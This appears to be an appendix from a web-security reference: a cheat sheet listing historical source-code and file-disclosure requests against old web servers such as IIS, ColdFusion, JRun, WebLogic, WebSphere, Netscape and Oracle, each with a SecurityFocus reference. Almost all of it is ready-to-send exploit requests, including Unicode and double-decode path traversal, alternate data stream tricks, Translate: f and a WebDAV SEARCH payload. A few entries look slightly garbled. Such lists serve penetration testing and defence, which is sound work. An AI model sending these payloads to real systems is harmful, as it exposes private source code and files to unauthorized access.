## Source Code Discovery Patched Exploits

> This appendix contains a list of all the major source code disclosure techniques discovered over the years. Many of them are specific to particular bugs in particular versions of software. Others are generic across platforms and have been known to reappear contrary to what the vendors say.

#### Source Code, File, and Directory Disclosure Cheat Sheet

__Allaire ColdFusion__

1. GET /CFDOCS/snippets/viewexample.cfm?viewexample.cfm Tagname=<relative path to CFM file> HTTP/1.0
  - http://www.securityfocus.com/bid/115

__Allaire JRun Alternative Data Stream__

1. GET /file.jsp::$DATA HTTP/1.0
  - http://www.securityfocus.com/bid/3664

__Allaire JRun Server Side Include__

- http://www.securityfocus.com/bid/3589

1. GET /file HTTP/1.0
1. Content Length: <length of filename + 28> <!—#include virtual="<filename>"—>

__Apache Tomcat__

- http://www.securityfocus.com/bid/2527

1. GET /file.js%70 HTTP/1.0
1. GET /file%252ejsp HTTP/1.0

__BEA WebLogic Case Sensitive File Extension__

- http://www.securityfocus.com/bid/1328

1. GET /file.JSP HTTP/1.0
1. GET /file.jsP HTTP/1.0
1. GET /file.Jsp HTTP/1.0

__BEA WebLogic 5.1__

1. GET /file.js%70 HTTP/1.0
  - http://www.securityfocus.com/bid/2527

__BEA WebLogic FileServlet__

1. GET /ConsoleHelp/file.jsp HTTP/1.0
  - http://www.securityfocus.com/bid/1518

__BEA WebLogic /file/__

1. GET /file/file.jsp HTTP/1.0
  - http://www.securityfocus.com/bid/1378

__BEA WebLogic /*.shtml/__

1. GET /*.shtml/file.jsp HTTP/1.0
  - http://www.securityfocus.com/bid/1517

__IBM WebSphere Case Sensitive File Extension__

- http://www.securityfocus.com/bid/1328

1. GET /file.JSP HTTP/1.0
1. GET /file.jsP HTTP/1.0
1. GET /file.Jsp HTTP/1.0

__IBM WebSphere /servlet/file/__

1. GET /servlet/file/file.jsp HTTP/1.0
 - http://www.securityfocus.com/bid/1500

__Microsoft IIS 4.0 + FAT Filesystem__

1. GET /file.%E2%73%70 HTTP/1.0
 - http://www.securityfocus.com/bid/2909

__Microsoft IIS 4.0 Alternative Data Stream__

1. GET /file::$DATA HTTP/1.0
  - http://www.securityfocus.com/bid/149

__Microsoft IIS +.htr__

1. GET /file.asp+.htr HTTP/1.0
  - http://www.securityfocus.com/bid/1488

__Microsoft IIS Translate: f__

1. GET /file.asp HTTP/1.0 Translate: f
 - http://www.securityfocus.com/bid/1578

__Microsoft IIS 3.0 %2e__

1. GET /file%2easp HTTP/1.0
 - http://www.securityfocus.com/bid/1814

__Microsoft IIS 2.0/3.0 Append "."__

- http://www.securityfocus.com/bid/2074

1. GET /file.asp. HTTP/1.0
1. GET /file.pl HTTP/1.0
1. GET /file.asp%2e HTTP/1.0
1. GET /file.pl%2e HTTP/1.0

__Oracle /_pages/__

1. GET /_pages/ HTTP/1.0
 - http://www.securityfocus.com/bid/

__Sun Java Web Server .jhtml__

- http://www.securityfocus.com/bid/1891

1. GET /file.jhtml. HTTP/1.0
1. GET /file.jhtml\HTTP/1.0

__Allaire ColdFusion Server exprcalc.cfm__

1. GET /cfdocs/expeval/ExprCalc.cfm?OpenFile Path=c:\file HTTP/1.0
 - http://www.securityfocus.com/bid/115

__Allaire ColdFusion openfile.cfm__

1. GET /cfdocs/expeval/openfile.cfm ?????????? HTTP/1.0
 - http://www.securityfocus.com/bid/115

__Allaire ColdFusion sourcewindow.cfm__

1. GET /cfdocs/exampleapp/docs/sourcewindow.cfm?Template=../../file HTTP/1.0
 - http://www.securityfocus.com/bid/115

__Allaire JRun /servlet/__

- http://www.securityfocus.com/bid/1833

1. GET /servlet/ssiservlet/../../file HTTP/1.0
1. GET /servlet/com.livesoftware.jrun plugins.ssi.SSIFilter/../../file HTTP/1.0

__Apache Web Server + PHP.EXE for Win32__

1. GET /php/php.exe?c:\file HTTP/1.0
 - http://www.securityfocus.com/bid/3786

__Apache Web Server + PHP3__

1. GET /file.php3.%5c../..%5c<relative path to file> HTTP/1.0
 - http://www.securityfocus.com/bid/2060

__Microsoft IIS Unicode__

- http://www.securityfocus.com/bid/1806

1. GET /scripts/..%c1%1c../<relative path to file> HTTP/1.0
1. GET /scripts/..%c0%9v../< relative path to file> HTTP/1.0
1. GET /scripts/..%c0%af../< relative path to file> HTTP/1.0

__Microsoft IIS Double Decode__

1. GET /scripts/..%255c..%255c<relative path to file> HTTP/1.0
 - http://www.securityfocus.com/bid/2708

__Microsoft IIS %20.htr__

1. GET /file%20("%20" repeated 230 times).htr HTTP/1.0
 - http://www.securityfocus.com/bid/1191

__Microsoft IIS idq.dll__
1. GET /query.idq?CiTemplate=<relative path to file> HTTP/1.0
 - http://www.securityfocus.com/bid/968

__Microsoft IIS showcode.asp__

1. GET /msadc/Samples/SELECTOR/showcode.asp?source=/msadc/Samples/<relative path to file> HTTP/1.0
 - http://www.securityfocus.com/bid/167

__Microsoft IIS codebrws.asp__

1. GET /iissamples/exair/howitworks/ codebrws.asp?source=<relative path to file> HTTP/1.0
  - http://www.securityfocus.com/bid/167

__Microsoft IIS viewcode.asp__

- http://support.microsoft.com/directory/article.asp?ID=KB;EN-US;Q231656&;

1. GET /Sites/Knowledge/Membership/ Inspired/ViewCode.asp?source=<relative path to file> HTTP/1.0
1. GET /Sites/Knowledge/Membership/ Inspiredtutorial/ViewCode.asp?source=<relative path to file> HTTP/1.0
1. GET /Sites/Samples/Knowledge/ Membership/Inspired/ViewCode.asp? source=<relative path to file> HTTP/1.0

__Netscape Enterprise Server %20__

1. GET /file%20 HTTP/1.0
 - http://www.securityfocus.com/bid/273

__Netscape Enterprise Server /publisher__

1. GET /publisher HTTP/1.0
 - http://www.securityfocus.com/bid/2416

__Netscape Enterprise Server Win32 8.3 filename__

- http://www.securityfocus.com/bid/584

1. Normal Request: `GET /directory/ HTTP/1.0`
1. Exploitative Request: `GET /direct~1/ HTTP/1.0`


__Allaire JRun //WEB-INF/__

1. GET //WEB-INF/ HTTP/1.0
 - http://www.securityfocus.com/bid/3662

__Allaire JRun %3f__

1. GET /%3f.jsp HTTP/1.0
 - http://www.securityfocus.com/bid/3592

__Apache Web Server + Mac OS X .DS_Store__

- http://www.securityfocus.com/bid/3316

1. GET /.DS_Store HTTP/1.0
1. GET /.FBCIndex HTTP/1.0

__Apache Web Server Multiview__

- http://www.securityfocus.com/bid/3009

1. GET /?M=A HTTP/1.0
1. GET /?S=D HTTP/1.0

__Apache Web Server Long Slash__

1. GET <1 to 4096 '/' characters> HTTP/1.0
 - http://www.securityfocus.com/bid/2503

__Apache Web Server/cgi-bin/test-cgi__

- http://www.securityfocus.com/bid/2003

1. GET /cgi-bin/test-cgi?/* HTTP/1.0
1. GET /cgi-bin/test-cgi?* HTTP/1.0


__BEA WebLogic /%00/__

- http://www.securityfocus.com/bid/2513

1. GET /%00/ HTTP/1.0
1. GET /%2e/ HTTP/1.0
1. GET /%2f/ HTTP/1.0
1. GET /%5c/ HTTP/1.0

__Microsoft IIS 5.0 WebDAV__

- http://www.securityfocus.com/bid/1756

```
SEARCH / HTTP/1.1
Host: <hostname or ip address>
Content-Type: text/xml
Content-Length: 133
<?xml version="1.0"?>
<g:searchrequest xmlns:g="DAV:">
<g:sql>
Select "DAV:displayname" from scope()
</g:sql>
</g:searchrequest>
```

__Microsoft IIS 3.0/4.0 BDIR.HTR__

1. GET /scripts/iisadmin/bdir.htr??c:\HTTP/1.0
  - http://www.securityfocus.com/bid/2280

__Netscape Enterprise Server INDEX__

1. INDEX / HTTP/1.0
  - http://www.securityfocus.com/bid/2285

__Netscape Enterprise Server /?wp-cs-dump__

- http://www.securityfocus.com/bid/1063

1. GET /?wp-cs-dump HTTP/1.0
1. GET /?wp-ver-info HTTP/1.0
1. GET /?wp-html-rend HTTP/1.0

__Oracle Internet Application Server /WebDB/admin_/__

1. GET /WebDB/admin_/ HTTP/1.0
 - http://www.securityfocus.com/bid/2171

__Oracle 9i Application Server mod_plsql__

- http://www.securityfocus.com/bid/3727

1. GET /pls/sample/admin_/help/..%255
1. c<relative path to file> HTTP/1.0
